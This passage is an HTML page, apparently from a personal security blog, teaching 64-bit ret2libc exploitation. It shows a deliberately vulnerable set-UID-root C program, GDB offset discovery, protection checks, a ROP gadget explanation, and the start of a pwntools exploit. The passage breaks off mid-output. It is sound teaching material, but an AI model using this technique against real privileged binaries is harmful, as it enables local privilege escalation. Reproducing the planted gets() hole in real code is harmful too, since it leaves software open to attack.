@@ -1,0 +1,510 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ret2libc - Part 2</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/monokai.css">
+    <link rel="stylesheet" href="/articles.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="hero">
+        <div class="hero-content">
+            <img src="/img/articles/logo11.png" alt="index-logo" class="index-logo">
+            <h1>Ret2libc - Part 2</h1>
+            <p>leveraging <i>libc</i> to exploit a buffer overflow</p>
+            <a href="/articles.html" class="mainbtn" class="mainbtn">More articles</a>
+        </div>
+    </section>
+    <section class="article-content">
+        <div class="container">
+            <div class="article-content-main">
+                <h2>Introduction</h2><br/>
+<p>oday, we will continue exploring the Ret2libc technique, with a focus on 64-bit exploitation. While the core concept remains the same, there are notable differences between exploiting Ret2libc in a 32-bit environment and a 64-bit one.</p><br/>
+<p>We will also see the Return-Oriented Programming (ROP) concept in practice, which I introduced in my previous article</p><br/>
+<br/><h3 class="note">Note</h3><br/>
+<p>Before we proceed, I highly recommend reading my <a href="https://elswix.github.io/articles/10/64-bit-vs-32-bit.html">previous article</a>, where I introduced the concepts of 64-bit exploitation. Nevertheless, we will re-explain some of these concepts in this article.</p><br/>
+<p>To fully understand this article, you should first read<a href="https://elswix.github.io/articles/8/return-2-libc.html"> Part 1 of the Ret2libc exploitation series</a>, where I cover crucial concepts that we will build upon here. Additionally, that article demonstrates the Ret2PLT (memory leak) technique, which is central to exploiting 64-bit Ret2libc.</p><br/><br/>
+<h2>Calling Conventions</h2><br/>
+<p><strong>Calling conventions</strong> define how functions communicate with each other, especially how they pass arguments and return values. For <strong>64-bit Linux</strong> systems, the <strong>System V AMD64 ABI (Application Binary Interface)</strong> is commonly used. According to this convention, the first few arguments to a function are passed through specific registers: <code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8</code>, and <code>R9</code>. Additional arguments are placed on the stack. This method helps optimize performance by reducing the overhead of memory access.</p><br/>
+<p>When a function returns a value, it is typically placed in the RAX register. The calling convention also specifies that the stack must be aligned to a 16-byte boundary before making a function call. This alignment ensures that functions operate efficiently and maintain compatibility with various processor optimizations. </p><br/>
+<h2>Return-Oriented Programming (ROP)</h2><br/>
+<p><strong>Return-Oriented Programming (ROP)</strong> is a technique used to exploit vulnerabilities in software. Instead of injecting malicious code, an attacker uses existing pieces of code (called "gadgets") already present in the program.</p><br/>
+<p><strong>ROP</strong> is highly effective for exploiting Buffer Overflow vulnerabilities. Imagine you're dealing with a vulnerable binary and discover a potential vector to exploit a buffer overflow vulnerability. Everything seems promising until you realize that the binary has protections in place, such as the <strong>NX bit</strong>, which <strong>prevent you from using shellcode</strong> to exploit the buffer overflow. This protection means you cannot directly inject instructions into memory, as they won't execute even if you manage to redirect the program flow to their location.</p><br/>
+<p>Since you can't exploit the buffer overflow vulnerability using the conventional shellcode technique, you turn to the Ret2libc technique, which is sometimes easier to exploit than shellcode. You know that in order to leverage the libc library to call functions like <code>system()</code>, you need to pass parameters to these functions. In 32-bit binaries, this is straightforward, as you can simply pass them through the stack. However, in 64-bit binaries, the process is different. As mentioned earlier, the first six parameters for functions in 64-bit programs are passed through specific registers: <code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8</code>, and <code>R9</code>, respectively. This adds an extra challenge to achieving your objective, as you need to load these registers with the appropriate parameter values to call the function. This would be easier if you could inject shellcode into memory, using tools like <code>msf-nasm_shell</code> to create custom shellcode. However, this approach isn't possible when dealing with a stack-based buffer overflow where the NX bit is enabled.</p><br/>
+<p>One way to load values into these registers (specifically <code>RDI</code> in this case, since <code>system()</code> only requires one parameter) is by using predefined code within the binary. However, this is not straightforward, as these code segments must end with a <code>ret</code> instruction, such as <code>pop rdi; ret</code>. This sequence would be ideal, as it allows you to pop the parameter value off the stack, followed by popping the next address (the <code>system()</code> address) into the Instruction Pointer, ensuring that the desired function is called once the parameter register is loaded.</p><br/>
+<p>These instruction sequences is what we refer to as <strong>ROP gadgets</strong>. Fortunately, there are several tools that can help you find these snippets of code (ROP gadgets). We will use <code>ropper</code> to demonstrate this technique, though there are many other tools available as well. In addition to using ROP gadgets that are present in the binary, you can also use those found in <strong>dynamically linked libraries</strong>, such as <code>libc</code>.</p><br/>
+<h2>Exploitation</h2><br/>
+<p>To demonstrate this technique, I will reuse the program we exploited in Part 1. However, this time, I will directly include the ROP gadgets we need within the program so that we can use them as required.</p><br/>
+<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">auxiliaryFunction</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">__asm__</span><span class="w"> </span><span class="p">(</span><span class="w"></span>
+<span class="w">        </span><span class="s">"pop %rdi</span><span class="se">\n</span><span class="s">"</span><span class="w"></span>
+<span class="w">        </span><span class="s">"ret"</span><span class="w">  </span>
+<span class="w">    </span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">vulnerable</span><span class="p">(){</span><span class="w"></span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buff</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span><span class="w"></span>
+
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[*] Enter a string: "</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">buff</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Your string: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">buff</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(){</span><span class="w"></span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Welcome</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">vulnerable</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</pre></div>
+<p>Let's compile it. This time, we will use the <code>-no-pie</code> parameter, as GCC, by default, creates a 64-bit binary if no other options are specified. We'll also specify the <code>-fno-stack-protector</code> parameter to avoid have to lead with the Stack Canary protection. </p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">gcc</span> <span class="n">program</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">program</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">pie</span>
+</pre></div>
+<p>Before beginning the exploitation, we must ensure that the binary has the Set-UID bit enabled and is owned by root.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">sudo</span> <span class="n">chown</span> <span class="n">root</span><span class="p">:</span><span class="n">root</span> <span class="o">./</span><span class="n">program</span>
+<span class="nd">elswix@ubuntu$</span> <span class="n">sudo</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">s</span> <span class="o">./</span><span class="n">program</span>
+</pre></div>
+<p>Now, let's begin the exploitation process.</p><br/>
+<p>I will explain the entire exploitation process once more, as I did in Part 1.</p><br/>
+<p>First, we need to identify the buffer overflow vulnerability. To do this, run the program and input a very long string:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Welcome</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Your</span> <span class="n">string</span><span class="p">:</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa</span>
+<span class="n">zsh</span><span class="p">:</span> <span class="n">segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>  <span class="o">./</span><span class="n">program</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>Great! The program has crashed, indicating that our string overflowed the allocated buffer for user input and reached the return address, causing the program to attempt to return to an invalid memory location.</p><br/>
+<p>As always, we need to identify which part of our string overwrote the return address. This information will give us control over the program's execution flow. To achieve this, I'll use GDB (the GNU Debugger) to conduct a thorough analysis of the program's behavior.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="o">./</span><span class="n">program</span>
+<span class="n">GEF</span> <span class="k">for</span> <span class="n">linux</span> <span class="n">ready</span><span class="p">,</span> <span class="nb">type</span> <span class="n">`</span><span class="n">gef</span><span class="s1">' to start, `gef config'</span> <span class="n">to</span> <span class="n">configure</span>
+<span class="mi">88</span> <span class="n">commands</span> <span class="n">loaded</span> <span class="ow">and</span> <span class="mi">5</span> <span class="n">functions</span> <span class="n">added</span> <span class="k">for</span> <span class="n">GDB</span> <span class="mf">12.1</span> <span class="ow">in</span> <span class="mf">0.00</span><span class="n">ms</span> <span class="n">using</span> <span class="n">Python</span> <span class="n">engine</span> <span class="mf">3.10</span>
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="nn">program...</span>
+<span class="p">(</span><span class="n">No</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">program</span><span class="p">)</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p>As observed, I am using the <a href="https://github.com/hugsy/gef">GEF</a> extension, which provides useful tools to simplify our analysis.</p><br/>
+<p>Let’s generate a pattern string:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">pattern</span> <span class="n">create</span> <span class="mi">150</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">a</span> <span class="n">pattern</span> <span class="n">of</span> <span class="mi">150</span> <span class="nb">bytes</span> <span class="p">(</span><span class="n">n</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Saved</span> <span class="k">as</span> <span class="s1">'$_gef0'</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p>This pattern string will help us determine how many characters we need to input to overwrite the return address, which is crucial for successful exploitation.</p><br/>
+<p>Now, let's run the program and enter the generated string:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">r</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Local</span><span class="o">/</span><span class="n">bufferoverflow</span><span class="o">-</span><span class="n">article</span><span class="o">/</span><span class="n">part2</span><span class="o">/</span><span class="n">program</span> 
+<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
+<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="o">.</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Welcome</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Your</span> <span class="n">string</span><span class="p">:</span> <span class="n">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa</span>
+
+<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
+<span class="mh">0x00000000004011d1</span> <span class="ow">in</span> <span class="n">vulnerable</span> <span class="p">()</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>As observed, the program crashed before returning to the invalid address.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="n">$</span><span class="n">rip</span>
+<span class="o">=&gt;</span> <span class="mh">0x4011d1</span> <span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">78</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">ret</span>
+<span class="nd">gef$</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="n">$</span><span class="n">rsp</span>
+<span class="mh">0x7fffffffdda8</span><span class="p">:</span>  <span class="s2">"paaaaaaaqaaaaaaaraaaaaaasaaaaa"</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p>Remember that the <code>ret</code> instruction pops the value pointed to by the stack pointer (<code>rsp</code>) and loads it into the instruction pointer (<code>rip</code>). Therefore, if the <code>ret</code> instruction were executed, the instruction pointer would point to the address <code>0x6161616161616170</code>, which represents the string <code>paaaaaaa</code> in hexadecimal.</p><br/>
+<p>To determine how many characters we need to input to reach the return address, we can use the <code>pattern offset</code> command:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">pattern</span> <span class="n">offset</span> <span class="n">$</span><span class="n">rsp</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="s1">'7061616161616161'</span><span class="o">/</span><span class="s1">'6161616161616170'</span> <span class="k">with</span> <span class="n">period</span><span class="o">=</span><span class="mi">8</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">at</span> <span class="n">offset</span> <span class="mi">120</span> <span class="p">(</span><span class="n">little</span><span class="o">-</span><span class="n">endian</span> <span class="n">search</span><span class="p">)</span> <span class="n">likely</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>This means we need to input 120 characters before reaching the return address on the stack.</p><br/>
+<h3>Binary Protections</h3><br/>
+<p>As we've discussed in previous articles, when exploiting a Buffer Overflow, we often encounter various binary protections. In this case, when compiling the binary, we used the <code>-no-pie</code> and <code>-fno-stack-protector</code> options, which disable the Position Independent Executable (PIE) and Stack Canary protections.</p><br/>
+<p>The <strong>Stack Canary</strong> protection works by placing a random integer value (known as a "canary") onto the stack. Before a function returns, this value is checked against an original copy stored in a secure location. If the value matches, the program continues its normal execution. If the value has been overwritten (indicating a buffer overflow), the program detects this and terminates to prevent exploitation. I demonstrated how to bypass this protection in the <strong>Format String Vulnerability</strong> article.</p><br/>
+<p>The <strong>Position Independent Executable (PIE)</strong> feature randomizes the memory addresses used by the binary each time it is loaded. This is similar to Address Space Layout Randomization (ASLR), but while ASLR randomizes the base address of the stack, heap, and libraries, PIE specifically randomizes the addresses of the binary's code and data sections. For example, if you've defined a function called <code>printUsername()</code> in your program, its address will vary between executions.</p><br/>
+<p>We already knew that these protections were disabled, but let’s check if there are any additional protections present in the binary. We can do this using <code>checksec</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">checksec</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">checksec</span> <span class="k">for</span> <span class="s1">'/home/elswix/Desktop/elswix/Local/bufferoverflow-article/part2/program'</span>
+<span class="n">Canary</span>                        <span class="p">:</span> <span class="n">✘</span> 
+<span class="n">NX</span>                            <span class="p">:</span> <span class="n">✓</span> 
+<span class="n">PIE</span>                           <span class="p">:</span> <span class="n">✘</span> 
+<span class="n">Fortify</span>                       <span class="p">:</span> <span class="n">✘</span> 
+<span class="n">RelRO</span>                         <span class="p">:</span> <span class="n">Partial</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>As observed, only the <strong>NX (No eXecute)</strong> protection is enabled. However, that's not a problem for us, as we've already dealt with it in previous articles.</p><br/>
+<p>Let's check if ASLR is enabled by printing the shared libraries linked to this binary:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ldd</span> <span class="n">program</span>
+    <span class="n">linux</span><span class="o">-</span><span class="n">vdso</span><span class="o">.</span><span class="n">so</span><span class="mf">.1</span> <span class="p">(</span><span class="mh">0x00007fff6878f000</span><span class="p">)</span>
+    <span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span> <span class="o">=&gt;</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span> <span class="p">(</span><span class="mh">0x00007706b9c00000</span><span class="p">)</span>
+    <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span> <span class="p">(</span><span class="mh">0x00007706b9f73000</span><span class="p">)</span>
+<span class="nd">elswix@ubuntu$</span> <span class="n">ldd</span> <span class="n">program</span>
+    <span class="n">linux</span><span class="o">-</span><span class="n">vdso</span><span class="o">.</span><span class="n">so</span><span class="mf">.1</span> <span class="p">(</span><span class="mh">0x00007ffe0f3f7000</span><span class="p">)</span>
+    <span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span> <span class="o">=&gt;</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="mf">.6</span> <span class="p">(</span><span class="mh">0x00007743e9400000</span><span class="p">)</span>
+    <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span> <span class="p">(</span><span class="mh">0x00007743e983b000</span><span class="p">)</span>
+</pre></div>
+<p>As shown above, the address changed between executions of <code>ldd</code>, indicating that ASLR protection is enabled.</p><br/>
+<p>With all this information, we can now commence the exploitation process.</p><br/>
+<h3>Strategy</h3><br/>
+<p>With ASLR enabled, the addresses of libc functions will vary with each execution. This means we can't determine these addresses beforehand. Additionally, NX protection is enabled, preventing us from injecting malicious instructions into memory and redirecting the program flow to them.</p><br/>
+<p>In Part 1, I demonstrated a technique to overcome ASLR, which was preventing us from performing a ret2libc attack. This technique is called Brute Force. It involves selecting a base libc address, calculating the offsets of our target functions, and then repeatedly executing the program until the base libc address aligns with our chosen one. That would work in a 32-bit program; however, in 64-bit programs, addresses are larger, which decreases the possibility of collisions to almost impossible.</p><br/>
+<br/><h3 class="note">Note</h3><br/>
+<p>Before continuing, I highly recommend reading the <a href="https://elswix.github.io/articles/6/PLT-and-GOT.html">PLT &amp; GOT article</a> if you haven't already, as it provides a comprehensive explanation of how the PLT and GOT work. Otherwise, you might feel a bit lost if you don't understand these concepts.</p><br/>
+<p>Nevertheless, this isn't a problem for us. We've already discussed a technique called <code>ret2plt</code>, which involves leaking a GOT entry to obtain the address of a libc function and then subtracting its offset to determine the base libc address. This technique is particularly useful in 64-bit systems, as it doesn't rely on brute force and provides a valid address at execution time by leaking the GOT.</p><br/>
+<p>Once the base address of libc is obtained, we can call any libc function by adding its offset to this base address.</p><br/>
+<br/><h3 class="note">Note</h3><br/>
+<p>Remember that to obtain the offsets of the functions you want to call, you must extract them from <strong>the exact same libc binary (or version)</strong> that is dynamically linked to the program. Otherwise, you'll end up with <strong>an incorrect offset</strong> and won't be able to calculate the actual function address.</p><br/><br/>
+<h2>Exploitation</h2><br/>
+<p>First, we need to select a function whose GOT entry we will leak and another function that allows us to write to the standard output, such as <code>puts()</code>. This function is typically called by the program at the beginning, so its GOT entry will already be populated with a libc address. Additionally, <code>puts()</code> allows us to print messages, which is useful for displaying the address stored in the GOT entry. Moreover, since it is called by the program, <code>puts()</code> has its own PLT entry, enabling us to call it without needing to know its actual address.</p><br/>
+<p>Remember that the PLT entry of a function is embedded directly in the binary. Since the program has PIE protection disabled, we can determine the PLT entry address before even executing the program.</p><br/>
+<p>To obtain the address of the PLT entry of <code>puts()</code>, you can use <code>objdump</code>. Additionally, you'll also note that the GOT entry address is commented next to the <code>jmp</code> instruction:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">D</span> <span class="n">program</span>  <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">i</span> <span class="s1">'puts'</span> <span class="o">|</span> <span class="n">head</span> <span class="o">-</span><span class="n">n</span> <span class="mi">2</span>
+<span class="mi">0000000000401060</span> <span class="o">&lt;</span><span class="n">puts</span><span class="n">@plt</span><span class="o">&gt;</span><span class="p">:</span>
+  <span class="mi">401064</span><span class="p">:</span>    <span class="n">f2</span> <span class="n">ff</span> <span class="mi">25</span> <span class="n">ad</span> <span class="mi">2</span><span class="n">f</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="n">bnd</span> <span class="n">jmp</span> <span class="o">*</span><span class="mh">0x2fad</span><span class="p">(</span><span class="o">%</span><span class="n">rip</span><span class="p">)</span>        <span class="c1"># 404018 &lt;puts@GLIBC_2.2.5&gt;</span>
+</pre></div>
+<p>As you can see, we obtained the <code>puts@plt</code> address (the PLT entry) and the <code>puts@got.plt</code> address (the GOT entry). Make a note of these addresses, as we'll need to include them in our exploit.</p><br/>
+<h3>Return-Oriented Programming in Practice</h3><br/>
+<p>Recalling our earlier discussion on Calling Conventions, in 64-bit programs, parameters are passed through registers. To pass the GOT entry address as a parameter to <code>puts()</code>, we need to load this address into the <code>rdi</code> register.</p><br/>
+<p>To accomplish this, we'll use a ROP gadget. Since we control the stack's contents, we can utilize a <code>pop rdi; ret</code> gadget.</p><br/>
+<p>This means we need to place the address of the <code>pop rdi; ret</code> gadget in the return address slot on the stack, followed by the GOT address of <code>puts()</code>, and then the address of the PLT entry for <code>puts()</code>. When the function returns, it will return to the <code>pop rdi</code> instruction, moving the Stack Pointer (RSP) to the next value (the GOT address). When <code>pop rdi</code> executes, it will pop the GOT address off the stack and load it into <code>rdi</code>. Then, upon reaching the <code>ret</code> instruction after <code>pop rdi</code>, the stack will pop the PLT entry address of <code>puts()</code> and load it into the Instruction Pointer, redirecting the program flow to <code>puts()</code>. Since we populated <code>rdi</code>, <code>puts()</code> will use that value as its parameter (which is the GOT entry) and print the referenced address (the actual libc address).</p><br/>
+<p>Let's visualize a graphical representation of how the stack and program flow will appear:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/11/img/1.png"/></p><br/>
+<p>This is how the program would look before reaching the <code>ret</code> instruction if no buffer overflow is triggered. As observed, <code>RIP</code> points to the <code>ret</code> instruction, and <code>RSP</code> points to the return address. This means that once the <code>ret</code> instruction is executed, the value pointed to by <code>RSP</code> (<code>0x80401</code>) will be loaded into <code>RIP</code>, and <code>RSP</code> will move up (since the stack grows downward).</p><br/>
+<p>Now, let’s see how the program would look when triggering the buffer overflow by placing the values on the stack:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/11/img/2.png"/></p><br/>
+<p>As observed, the buffer overflow was triggered, and we populated the stack with our desired values. As you can see, in the return address slot, we placed the address of the <code>pop rdi; ret</code> gadget (since we don't know the exact address of the ROP gadget yet, I selected a placeholder address just for the example). This means that once the function returns, the program flow will transfer to the ROP gadget.</p><br/>
+<p>Let's illustrate this process graphically:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/11/img/3.png"/></p><br/>
+<p>As you can see, the RIP now points to address 48, where the <code>pop rdi</code> instruction is located. Following that instruction is the <code>ret</code> instruction, thus completing the ROP gadget. Additionally, the RSP has moved 8 bytes forward due to the <code>ret</code> instruction. This means that when executing the <code>pop rdi</code>, the value pointed to by the RSP will be loaded into <code>rdi</code>—in this case, <code>0x404018</code>, which corresponds to the GOT entry address of <code>puts()</code>.</p><br/>
+<p>Let's execute the <code>pop rdi</code> instruction:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/11/img/4.png"/></p><br/>
+<p>Once the <code>pop rdi</code> instruction is executed, the value pointed to by <code>RSP</code> is loaded into <code>rdi</code>. As a result, <code>RDI</code> now holds the value <code>0x404018</code>, which is the GOT entry address of <code>puts()</code>. This means we can now call the <code>puts()</code> function, as we've successfully populated the <code>rdi</code> register (the first parameter according to the calling conventions) with the correct value. The <code>RSP</code> now points to the address of the PLT entry for <code>puts()</code>. Therefore, when the <code>ret</code> instruction is executed after <code>pop rdi</code>, this address will be loaded into the <code>RIP</code>, effectively redirecting the program to the <code>puts()</code> function.</p><br/>
+<br/><h3 class="note">Note</h3><br/>
+<p>Calling a function via its PLT entry is practically the same as calling it through its actual address.</p><br/><br/>
+<p>Let's begin with the Python exploit. Here’s how it looks with the information we've gathered so far:</p><br/>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span> 
+
+
+<span class="c1"># junk</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">120</span>
+<span class="n">junk</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"A"</span><span class="o">*</span><span class="n">offset</span>
+
+<span class="c1"># binary symbols</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x401060</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x404018</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./program"</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">"error"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">main</span><span class="p">()</span>
+    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Aborting...</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</pre></div>
+<p>We have already located the addresses of the GOT and PLT entries for <code>puts()</code>. Next, we need to find an ROP gadget that will populate the <code>rdi</code> register and then return. To achieve this, I'll use <a href="https://github.com/sashs/Ropper">ropper</a>. You can install it with the following command: <code>pip install ropper</code>.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ropper</span> <span class="o">-</span><span class="n">f</span> <span class="n">program</span> <span class="o">--</span><span class="n">search</span> <span class="s2">"pop rdi; ret"</span>
+<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">Load</span> <span class="n">gadgets</span> <span class="kn">from</span> <span class="nn">cache</span>
